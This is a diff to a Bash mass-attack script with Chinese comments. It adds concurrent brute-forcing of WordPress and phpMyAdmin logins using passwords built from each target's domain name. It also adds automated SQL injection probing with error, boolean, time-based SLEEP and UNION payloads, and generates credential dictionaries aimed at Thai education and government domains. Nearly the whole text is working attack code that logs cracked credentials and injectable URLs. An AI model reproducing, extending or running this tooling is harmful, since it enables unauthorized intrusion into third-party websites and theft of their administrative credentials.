@@ -347,12 +347,14 @@ WP_PASS=$(wc -l < $OUT/shells/creds/wp_db_passwords.txt 2>/dev/null || echo 0)
 echo "  ✅ 提取凭证: env:$ENV_PASS config:$CONFIG_PASS wp:$WP_PASS"
 
 # ==========================================
-# 10. WordPress弱口令爆破（智能字典）
+# 10. WordPress弱口令爆破（增强字典）
 # ==========================================
-echo "[10/12] 🔓 WordPress弱口令（智能字典，并发10）..."
+echo "[10/14] 🔓 WordPress弱口令（增强字典，并发10）..."
 [ -f $OUT/shells/05_wordpress.txt ] && cat $OUT/shells/05_wordpress.txt | head -100 | xargs -P 10 -I {} bash -c '
     url="{}"
     wp_login="${url}/wp-login.php"
+    domain=$(echo "$url" | sed "s|https\?://||" | cut -d/ -f1)
+    keywords=$(echo "$domain" | sed "s/\.ac\.th//" | sed "s/\.edu\.th//" | sed "s/\.go\.th//")
     
     # 先测试默认凭证（快速）
     for cred in "admin:admin" "admin:password" "admin:123456" "admin:admin123" \
@@ -370,9 +372,21 @@ echo "[10/12] 🔓 WordPress弱口令（智能字典，并发10）..."
         fi
     done
     
-    # 再测试top100密码（admin用户）
-    [ -f '"$TOP100"' ] && while read pass; do
+    # 测试基于域名的密码（高成功率）
+    for pass in "${keywords}123" "${keywords}123456" "${keywords}2024" "${keywords}2025" "admin@${keywords}"; do
         resp=$(curl -skL -m 4 "$wp_login" -d "log=admin&pwd=$pass&wp-submit=Log+In" \
+            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
+        
+        if ! echo "$resp" | grep -qiE "incorrect|error|invalid" && \
+           echo "$resp" | grep -qiE "dashboard|admin"; then
+            echo "$url|admin:$pass" >> '"$OUT"'/shells/10_wp_creds.txt
+            exit 0
+        fi
+    done
+    
+    # 测试top100密码（admin用户）
+    [ -f '"$TOP100"' ] && while read pass; do
+        resp=$(curl -skL -m 3 "$wp_login" -d "log=admin&pwd=$pass&wp-submit=Log+In" \
             -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
         
         if ! echo "$resp" | grep -qiE "incorrect|error|invalid" && \
@@ -387,24 +401,26 @@ WP_CREDS=$(wc -l < $OUT/shells/10_wp_creds.txt 2>/dev/null || echo 0)
 echo "  ✅ WordPress凭证: $WP_CREDS"
 
 # ==========================================
-# 11. phpMyAdmin弱口令爆破（智能字典）
+# 11. phpMyAdmin弱口令爆破（增强字典）
 # ==========================================
-echo "[11/12] 🔓 phpMyAdmin弱口令（智能字典，并发10）..."
+echo "[11/14] 🔓 phpMyAdmin弱口令（增强字典，并发10）..."
 [ -f $OUT/shells/06_phpmyadmin.txt ] && cat $OUT/shells/06_phpmyadmin.txt | head -50 | xargs -P 10 -I {} bash -c '
     url="{}"
+    base_url=$(echo "$url" | sed "s|/pma.*||" | sed "s|/phpmyadmin.*||")
+    domain=$(echo "$base_url" | sed "s|https\?://||" | cut -d/ -f1)
+    keywords=$(echo "$domain" | sed "s/\.ac\.th//" | sed "s/\.edu\.th//" | sed "s/\.go\.th//")
     
-    # 先测试默认凭证
+    # 先测试默认凭证（快速）
     for cred in "root:" "root:root" "root:password" "root:123456" \
-                "admin:admin" "admin:password" "root:toor"; do
+                "admin:admin" "admin:password" "root:toor" "root:12345678"; do
         user=$(echo $cred | cut -d: -f1)
         pass=$(echo $cred | cut -d: -f2)
         
-        # phpMyAdmin登录
         resp=$(curl -skL -m 5 "$url" -d "pma_username=$user&pma_password=$pass" \
             -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
         
         if ! echo "$resp" | grep -qiE "cannot|error|access denied" && \
-           echo "$resp" | grep -qiE "main|database|server"; then
+           echo "$resp" | grep -qiE "main|database|server|phpmyadmin"; then
             echo "$url|$user:$pass" >> '"$OUT"'/shells/11_pma_creds.txt
             exit 0
         fi
@@ -419,9 +435,21 @@ echo "[11/12] 🔓 phpMyAdmin弱口令（智能字典，并发10）..."
         exit 0
     fi
     
+    # 测试基于域名的密码（高成功率）
+    for pass in "${keywords}123" "${keywords}123456" "root@${keywords}"; do
+        resp=$(curl -skL -m 4 "$url" -d "pma_username=root&pma_password=$pass" \
+            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
+        
+        if ! echo "$resp" | grep -qiE "cannot|error|access denied" && \
+           echo "$resp" | grep -qiE "main|database"; then
+            echo "$url|root:$pass" >> '"$OUT"'/shells/11_pma_creds.txt
+            exit 0
+        fi
+    done
+    
     # 测试top100（root用户）
     [ -f '"$TOP100"' ] && while read pass; do
-        resp=$(curl -skL -m 4 "$url" -d "pma_username=root&pma_password=$pass" \
+        resp=$(curl -skL -m 3 "$url" -d "pma_username=root&pma_password=$pass" \
             -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
         
         if ! echo "$resp" | grep -qiE "cannot|error|access denied" && \
@@ -438,7 +466,7 @@ echo "  ✅ phpMyAdmin凭证: $PMA_CREDS"
 # ==========================================
 # 12. 默认凭证快速检测（API/管理后台）
 # ==========================================
-echo "[12/12] 🔑 默认凭证检测（API/后台，并发20）..."
+echo "[12/14] 🔑 默认凭证检测（API/后台，并发20）..."
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
     
@@ -465,9 +493,178 @@ DEFAULT_CREDS_COUNT=$(wc -l < $OUT/shells/12_default_creds.txt 2>/dev/null || ec
 echo "  ✅ 默认凭证: $DEFAULT_CREDS_COUNT"
 
 # ==========================================
+# 13. SQL注入检测（布尔盲注+时间盲注+报错注入+联合查询）
+# ==========================================
+echo "[13/14] 💉 SQL注入检测（布尔+时间+报错+联合，并发15）..."
+cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
+    url="{}"
+    
+    # 提取URL参数（支持?和&）
+    if echo "$url" | grep -q "?"; then
+        base_url=$(echo "$url" | cut -d? -f1)
+        query_string=$(echo "$url" | cut -d? -f2)
+    else
+        base_url="$url"
+        query_string=""
+    fi
+    
+    # 提取参数名
+    params=$(echo "$query_string" | grep -oE "[a-zA-Z0-9_]+=" | tr -d "=" | sort -u)
+    
+    if [ -n "$params" ]; then
+        for param in $params; do
+            # 报错注入检测（最快，先检测）
+            error_resp=$(curl -skL -m 4 "${base_url}?${param}=1'"'"'" 2>/dev/null)
+            if echo "$error_resp" | grep -qiE "mysql|postgresql|sqlite|mssql|oracle|syntax error|sql error|database error|warning.*mysql|you have an error"; then
+                echo "${base_url}?${param}=1'"'"'" >> '"$OUT"'/shells/13_sqli_error.txt
+                break
+            fi
+            
+            # 布尔盲注检测
+            true_resp=$(curl -skL -m 4 "${base_url}?${param}=1'"'"' AND '"'"'1'"'"'='"'"'1" 2>/dev/null)
+            false_resp=$(curl -skL -m 4 "${base_url}?${param}=1'"'"' AND '"'"'1'"'"'='"'"'2" 2>/dev/null)
+            
+            if [ "$true_resp" != "$false_resp" ] && [ -n "$true_resp" ] && [ -n "$false_resp" ] && \
+               [ $(echo "$true_resp" | wc -c) -gt 100 ] && [ $(echo "$false_resp" | wc -c) -gt 100 ]; then
+                # 时间盲注验证（确认布尔盲注后）
+                start=$(date +%s)
+                curl -skL -m 8 "${base_url}?${param}=1'"'"' AND SLEEP(5)--" >/dev/null 2>&1
+                end=$(date +%s)
+                
+                if [ $((end - start)) -ge 4 ]; then
+                    echo "${base_url}?${param}=1'"'"' AND SLEEP(5)--" >> '"$OUT"'/shells/13_sqli_time.txt
+                    break
+                fi
+            fi
+            
+            # 联合查询检测
+            union_resp=$(curl -skL -m 4 "${base_url}?${param}=1 UNION SELECT 1,2,3--" 2>/dev/null)
+            if echo "$union_resp" | grep -qE "[^0-9]2[^0-9]" && \
+               ! echo "$union_resp" | grep -qiE "error|syntax|mysql error|sql error" && \
+               [ $(echo "$union_resp" | wc -c) -gt 100 ]; then
+                echo "${base_url}?${param}=1 UNION SELECT 1,2,3--" >> '"$OUT"'/shells/13_sqli_union.txt
+                break
+            fi
+            
+            # 双引号注入检测
+            dq_error=$(curl -skL -m 4 "${base_url}?${param}=1\"" 2>/dev/null)
+            if echo "$dq_error" | grep -qiE "mysql|postgresql|sqlite|syntax error|sql error"; then
+                echo "${base_url}?${param}=1\"" >> '"$OUT"'/shells/13_sqli_error.txt
+                break
+            fi
+        done
+    fi
+' &
+wait
+SQLI_TIME=$(wc -l < $OUT/shells/13_sqli_time.txt 2>/dev/null || echo 0)
+SQLI_ERROR=$(wc -l < $OUT/shells/13_sqli_error.txt 2>/dev/null || echo 0)
+SQLI_UNION=$(wc -l < $OUT/shells/13_sqli_union.txt 2>/dev/null || echo 0)
+SQLI_TOTAL=$((SQLI_TIME + SQLI_ERROR + SQLI_UNION))
+echo "  ✅ SQL注入: $SQLI_TOTAL (时间:$SQLI_TIME 报错:$SQLI_ERROR 联合:$SQLI_UNION)"
+
+# ==========================================
+# 14. 智能字典生成（基于域名/行业/地区/年份）
+# ==========================================
+echo "[14/14] 📚 智能字典生成（域名+行业+地区+年份）..."
+mkdir -p $OUT/shells/dicts
+
+# 从目标URL提取域名特征
+cat $OUT/targets.txt | head -200 | while read url; do
+    domain=$(echo "$url" | sed "s|https\?://||" | cut -d/ -f1 | cut -d: -f1)
+    
+    # 提取域名关键词（去除TLD）
+    keywords=$(echo "$domain" | sed "s/\.ac\.th//" | sed "s/\.edu\.th//" | sed "s/\.go\.th//" | sed "s/\.co\.th//" | sed "s/\.or\.th//")
+    
+    # 生成基于域名的密码（多种变体）
+    echo "${keywords}123" >> $OUT/shells/dicts/domain_based.txt
+    echo "${keywords}123456" >> $OUT/shells/dicts/domain_based.txt
+    echo "${keywords}2024" >> $OUT/shells/dicts/domain_based.txt
+    echo "${keywords}2025" >> $OUT/shells/dicts/domain_based.txt
+    echo "${keywords}2023" >> $OUT/shells/dicts/domain_based.txt
+    echo "admin@${keywords}" >> $OUT/shells/dicts/domain_based.txt
+    echo "${keywords}@123" >> $OUT/shells/dicts/domain_based.txt
+    echo "${keywords}admin" >> $OUT/shells/dicts/domain_based.txt
+    echo "admin${keywords}" >> $OUT/shells/dicts/domain_based.txt
+    
+    # 提取行业关键词（ac.th = 教育，go.th = 政府）
+    if echo "$domain" | grep -q "\.ac\.th"; then
+        echo "education123" >> $OUT/shells/dicts/industry_based.txt
+        echo "school123" >> $OUT/shells/dicts/industry_based.txt
+        echo "university123" >> $OUT/shells/dicts/industry_based.txt
+        echo "student123" >> $OUT/shells/dicts/industry_based.txt
+        echo "teacher123" >> $OUT/shells/dicts/industry_based.txt
+    fi
+    
+    if echo "$domain" | grep -q "\.go\.th"; then
+        echo "government123" >> $OUT/shells/dicts/industry_based.txt
+        echo "gov123" >> $OUT/shells/dicts/industry_based.txt
+        echo "public123" >> $OUT/shells/dicts/industry_based.txt
+    fi
+done
+
+# 添加年份变体（2020-2025）
+for year in 2020 2021 2022 2023 2024 2025; do
+    echo "admin${year}" >> $OUT/shells/dicts/years_based.txt
+    echo "password${year}" >> $OUT/shells/dicts/years_based.txt
+    echo "${year}admin" >> $OUT/shells/dicts/years_based.txt
+done
+
+# 合并所有密码字典（去重）
+cat $OUT/shells/dicts/domain_based.txt $OUT/shells/dicts/industry_based.txt \
+    $OUT/shells/dicts/years_based.txt 2>/dev/null | sort -u > $OUT/shells/dicts/smart_passwords.txt
+
+# 合并基础字典
+[ -f $TOP100 ] && cat $TOP100 >> $OUT/shells/dicts/smart_passwords.txt
+[ -f $PASS_DICT ] && head -500 $PASS_DICT >> $OUT/shells/dicts/smart_passwords.txt
+[ -f /root/passwords/thailand.txt ] && cat /root/passwords/thailand.txt >> $OUT/shells/dicts/smart_passwords.txt
+[ -f /root/passwords/education.txt ] && cat /root/passwords/education.txt >> $OUT/shells/dicts/smart_passwords.txt
+
+# 最终去重
+sort -u $OUT/shells/dicts/smart_passwords.txt > $OUT/shells/dicts/smart_dict.txt
+
+# 生成用户名+密码组合（智能组合）
+cat $OUT/shells/dicts/smart_dict.txt | while read pass; do
+    # 常见用户名
+    for user in admin administrator root test demo user webadmin manager; do
+        echo "$user:$pass" >> $OUT/shells/dicts/user_pass_combos.txt
+    done
+    
+    # 基于域名的用户名
+    if [ -f $OUT/shells/dicts/domain_based.txt ]; then
+        cat $OUT/shells/dicts/domain_based.txt | grep -v "@" | head -20 | while read domain_pass; do
+            domain_user=$(echo "$domain_pass" | sed "s/123//" | sed "s/2024//" | sed "s/2025//")
+            echo "${domain_user}:${pass}" >> $OUT/shells/dicts/domain_user_combos.txt
+        done
+    fi
+done
+
+# 添加泰国特定凭证组合
+[ -f /root/passwords/thailand.txt ] && cat /root/passwords/thailand.txt | while read pass; do
+    for user in admin administrator root thai admin_thai; do
+        echo "$user:$pass" >> $OUT/shells/dicts/thailand_combos.txt
+    done
+done
+
+# 添加默认凭证
+[ -f $DEFAULT_CREDS ] && cat $DEFAULT_CREDS >> $OUT/shells/dicts/enhanced_creds.txt
+
+# 合并所有凭证组合（优先级排序：默认 > 泰国 > 域名 > 通用）
+cat $OUT/shells/dicts/thailand_combos.txt $OUT/shells/dicts/domain_user_combos.txt \
+    $OUT/shells/dicts/user_pass_combos.txt 2>/dev/null | sort -u >> $OUT/shells/dicts/enhanced_creds.txt
+
+# 去重最终凭证字典
+sort -u $OUT/shells/dicts/enhanced_creds.txt > $OUT/shells/dicts/enhanced_creds_final.txt
+mv $OUT/shells/dicts/enhanced_creds_final.txt $OUT/shells/dicts/enhanced_creds.txt
+
+DICT_COUNT=$(wc -l < $OUT/shells/dicts/smart_dict.txt 2>/dev/null || echo 0)
+CRED_COUNT=$(wc -l < $OUT/shells/dicts/enhanced_creds.txt 2>/dev/null || echo 0)
+echo "  ✅ 生成字典: 密码$DICT_COUNT条，凭证组合$CRED_COUNT条"
+echo "  📁 字典文件: $OUT/shells/dicts/enhanced_creds.txt"
+
+# ==========================================
 # 统计汇总
 # ==========================================
-TOTAL_SHELLS=$((UPLOAD + FILES + API + GIT_LEAK + SSRF + BACKUP))
+TOTAL_SHELLS=$((UPLOAD + FILES + API + GIT_LEAK + SSRF + BACKUP + SQLI_TOTAL))
 TOTAL_CREDS=$((WP_CREDS + PMA_CREDS + DEFAULT_CREDS_COUNT))
 
 echo ""
@@ -482,6 +679,7 @@ echo "WordPress: $WP"
 echo "phpMyAdmin: $PMA"
 echo "SSRF: $SSRF"
 echo "备份文件: $BACKUP"
+echo "SQL注入: $SQLI_TOTAL (时间:$SQLI_TIME 报错:$SQLI_ERROR 联合:$SQLI_UNION)"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo "凭证爆破:"
 echo "  WordPress凭证: $WP_CREDS"
@@ -491,8 +689,10 @@ echo "  提取凭证: env:$ENV_PASS config:$CONFIG_PASS wp:$WP_PASS"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo "🎯 总计Shell/漏洞: $TOTAL_SHELLS"
 echo "🎯 总计凭证: $TOTAL_CREDS"
+echo "📚 智能字典: 密码$DICT_COUNT条，凭证组合$CRED_COUNT条"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo "结果目录: $OUT/shells/"
+echo "字典目录: $OUT/shells/dicts/"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
 # 显示关键结果
@@ -504,3 +704,7 @@ echo "━━━━━━━━━━━━━━━━━━━━━━━━�
 [ $PMA_CREDS -gt 0 ] && echo "" && echo "🔑 phpMyAdmin凭证:" && cat $OUT/shells/11_pma_creds.txt
 [ $DEFAULT_CREDS_COUNT -gt 0 ] && echo "" && echo "🔑 默认凭证:" && head -10 $OUT/shells/12_default_creds.txt
 [ $ENV_PASS -gt 0 ] && echo "" && echo "🔑 提取的密码:" && head -10 $OUT/shells/creds/env_passwords.txt
+[ $SQLI_TOTAL -gt 0 ] && echo "" && echo "💉 SQL注入:" && echo "  时间盲注:" && head -5 $OUT/shells/13_sqli_time.txt 2>/dev/null && \
+    echo "  报错注入:" && head -5 $OUT/shells/13_sqli_error.txt 2>/dev/null && \
+    echo "  联合查询:" && head -5 $OUT/shells/13_sqli_union.txt 2>/dev/null
+[ $CRED_COUNT -gt 0 ] && echo "" && echo "📚 增强凭证字典:" && head -20 $OUT/shells/dicts/enhanced_creds.txt
